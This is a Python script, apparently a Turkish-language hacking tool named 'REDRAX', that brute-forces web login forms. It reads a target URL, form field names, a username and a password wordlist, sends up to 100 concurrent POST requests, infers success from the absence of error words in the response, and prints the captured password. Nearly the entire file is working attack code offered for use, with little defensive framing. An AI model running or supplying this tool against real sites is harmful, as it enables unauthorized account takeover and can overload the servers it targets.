import os
import sys
import time
import asyncio
try:
    import aiohttp
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    os.system("pip install aiohttp colorama")
    import aiohttp
    from colorama import Fore, Style, init
    init(autoreset=True)

# Saldırı kontrol değişkenleri
SIFRE_BULUNDU = False
BULUNAN_SIFRE = None

def banner_goster():
    os.system("clear" if os.name != "nt" else "cls")
    print(f"""{Fore.RED}
  ██████╗ ███████╗██████╗ ██████╗  █████╗ ██╗  ██╗
  ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗██╔╝
  ██████╔╝█████╗  ██║  ██║██████╔╝███████║ ╚███╔╝ 
  ██╔══██╗██╔══╝  ██║  ██║██╔══██╗██╔══██║ ██╔██╗ 
  ██║  ██║███████╗██████╔╝██║  ██║██║  ██║██╔╝ ██╗
  ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
    {Fore.RED}--- [ASENKRON HACK] REDRAX WEB BRUTE-FORCE ENGINE v2.0 ---
    {Fore.YELLOW}[+] Mimari: Asyncio / AioHTTP (Mermi Hızında Şifre Deneme)
    {Fore.CYAN}[+] Hedef  : Web Giriş Panelleri (HTTP POST Form)
    """)

async def tekli_sifre_dene(session, url, user_field, pass_field, username, password):
    global SIFRE_BULUNDU, BULUNAN_SIFRE
    
    if SIFRE_BULUNDU:
        return

    # Web formuna gönderilecek veriler (Payload)
    data = {
        user_field: username,
        pass_field: password
    }
    
    try:
        print(f"{Fore.WHITE}[*] Asenkron Gönderildi -> {Fore.YELLOW}{password}")
        
        # Asenkron HTTP POST isteği atıyoruz
        async with session.post(url, data=data, timeout=3, allow_redirects=True) as response:
            icerik = await response.text()
            
            # Sızma testlerinde hatalı giriş uyarısı tespiti
            if response.status == 200 and "hatali" not in icerik.lower() and "wrong" not in icerik.lower() and "incorrect" not in icerik.lower():
                SIFRE_BULUNDU = True
                BULUNAN_SIFRE = password
    except Exception:
        pass

async def main_engine(url, user_field, pass_field, username, sifreler):
    global SIFRE_BULUNDU
    
    # Tek bir TCP bağlantı havuzu açıyoruz
    connector = aiohttp.TCPConnector(limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        
        # Tüm asenkron görevleri listeliyoruz
        gorevler = []
        for sifre in sifreler:
            if SIFRE_BULUNDU:
                break
            gorev = tekli_sifre_dene(session, url, user_field, pass_field, username, sifre)
            gorevler.append(gorev)
            
        # Tüm asenkron görevleri eşzamanlı olarak çalıştır
        await asyncio.gather(*gorevler)

def calistir():
    banner_goster()
    
    url = input(f"{Fore.GREEN}Hedef Login URL (Örn: http://hedef.com): ").strip()
    user_field = input(f"{Fore.GREEN}Kullanıcı Adı Form Alanı İsmi (Örn: username): ").strip()
    pass_field = input(f"{Fore.GREEN}Şifre Form Alanı İsmi (Örn: password): ").strip()
    username = input(f"{Fore.GREEN}Saldırılacak Kullanıcı Adı (Örn: admin): ").strip()
    wordlist_yolu = input(f"{Fore.GREEN}Wordlist Dosya Yolu (Örn: passwords.txt): ").strip()
    
    if not url or not user_field or not pass_field or not wordlist_yolu:
        print(f"{Fore.RED}[-] Hata: Eksik bilgi girdiniz.")
        return

    # Wordlist'i hafızaya çekme
    try:
        with open(wordlist_yolu, "r", encoding="utf-8", errors="ignore") as f:
            sifreler = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[-] Hata: Wordlist dosyası bulunamadı!")
        return

    banner_goster()
    print(f"{Fore.RED}[🚨] REDRAX ASENKRON MOTORU BAŞLATILDI!")
    print(f"{Fore.YELLOW}[*] Toplam {len(sifreler)} şifre asenkron kuyruğa alındı. Saldırı sürüyor...\n")
    
    baslangic = time.time()
    
    # Asenkron döngüyü tetikliyoruz
    asyncio.run(main_engine(url, user_field, pass_field, username, sifreler))
    
    bitis = time.time()
    toplam_sure = round(bitis - baslangic, 2)
    
    print("\n" + "="*55)
    if SIFRE_BULUNDU:
        print(f"{Fore.GREEN}[+] ELE GEÇİRİLDİ! ŞİFRE DOĞRULANDI.")
        print(f"{Fore.GREEN}[+] HEDEF KULLANICI : {username}")
        print(f"{Fore.GREEN}[+] BULUNAN ŞİFRE   : {BULUNAN_SIFRE}")
    else:
        print(f"{Fore.RED}[-] BAŞARISIZ! Wordlist bitti ancak doğru şifre yakalanamadı.")
        print(f"{Fore.WHITE}[!] İpucu: Web sitesinin koruma kelimelerini (Örn: 'hatalı giriş') koda göre optimize etmelisiniz.")
        
    print(f"{Fore.CYAN}[*] Toplam Denenen Şifre: {len(sifreler)}")
    print(f"{Fore.CYAN}[*] Toplam Harcanan Süre: {toplam_sure} saniye")
    print("="*55)

if __name__ == "__main__":
    calistir()
